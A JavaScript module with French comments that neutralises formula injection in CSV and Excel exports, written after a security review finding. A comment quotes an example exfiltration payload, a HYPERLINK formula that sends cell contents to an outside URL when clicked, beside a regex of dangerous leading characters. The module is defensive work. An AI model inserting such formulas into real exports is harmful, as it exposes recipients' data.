/**
 * Utilitaires PARTAGÉS des exports de fichiers (CSV et classeurs Excel).
 *
 * Ce module existe parce que la revue de sécurité du 13/09 a trouvé le MÊME
 * défaut dans deux fichiers différents (constat M-04) : `routes/exports-fse.js`
 * et `routes/exports.js` portaient chacun leur fonction d'échappement, écrites
 * séparément et fausses de la même façon. Corriger deux copies laisse toujours
 * la porte ouverte à une troisième ; la règle vit donc ici, en un seul endroit,
 * et elle est testable sans monter une route.
 *
 * Module PUR : aucune E/S, aucune dépendance.
 */

'use strict';

/**
 * Caractères qui, en TÊTE d'une cellule, déclenchent l'interprétation comme
 * FORMULE par Excel, LibreOffice Calc et Google Sheets.
 *   `=` formule ; `+` et `-` formules (Excel les accepte) ; `@` ancienne
 *   syntaxe d'appel de fonction ; TAB et CR, qui se retrouvent en tête après
 *   le découpage du fichier par le tableur.
 */
const DEBUTS_DANGEREUX = /^[=+\-@\t\r]/;

/**
 * Neutralise une cellule susceptible d'être évaluée comme une formule.
 *
 * POURQUOI CE N'EST PAS COUVERT PAR LE GUILLEMETAGE CSV : le guillemetage est
 * une convention de TRANSPORT. Le tableur retire les guillemets à la lecture,
 * PUIS évalue le contenu. Une commune de résidence valant
 * `=HYPERLINK("http://…/?d="&A2&B2;"Cliquez ici")` compose donc une
 * exfiltration en un clic sur le poste du destinataire — un agent de la DDETS,
 * hors de notre réseau, avec ses droits à lui.
 *
 * On préfixe d'une apostrophe : elle ne s'affiche pas dans la cellule et force
 * le mode texte sur les trois tableurs.
 *
 * ⚠ CHAÎNES UNIQUEMENT. Les nombres produits par le code (un délai de saisie
 * négatif, un écart) doivent rester des nombres : préfixés, ils cesseraient de
 * se trier et de s'additionner, et l'instructeur qui refait le calcul sur le
 * fichier tomberait sur une colonne inutilisable.
 *
 * @param {*} valeurBrute la valeur d'origine (son TYPE décide)
 * @param {string} texte sa forme texte déjà normalisée
 * @returns {string}
 */
function neutraliserFormule(valeurBrute, texte) {
  const s = String(texte === null || texte === undefined ? '' : texte);
  return typeof valeurBrute === 'string' && DEBUTS_DANGEREUX.test(s) ? `'${s}` : s;
}

/**
 * Échappement CSV complet : neutralisation de formule, puis guillemetage si la
 * cellule contient le séparateur, un guillemet ou un saut de ligne.
 * @param {*} v
 * @param {(v: *) => string} [format] normalisation préalable (dates, JSON…)
 */
function escCsv(v, format) {
  const brut = v === null || v === undefined ? '' : v;
  const texte = format ? String(format(brut)) : String(brut);
  const s = neutraliserFormule(brut, texte);
  return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/**
 * Nom du générateur porté par l'en-tête de traçabilité d'un fichier transmis
 * hors de la structure : « Prénom Nom », JAMAIS l'identifiant de connexion ni
 * l'adresse e-mail (constat m-04). L'autorité demande de savoir QUI a produit
 * le fichier, pas de recevoir un compte utilisateur de notre outil.
 */
function nomGenerateur(user) {
  if (!user) return 'inconnu';
  const nom = [user.first_name, user.last_name].filter(Boolean).join(' ').trim();
  return nom || user.username || `utilisateur #${user.id}`;
}

module.exports = { neutraliserFormule, escCsv, nomGenerateur, DEBUTS_DANGEREUX };
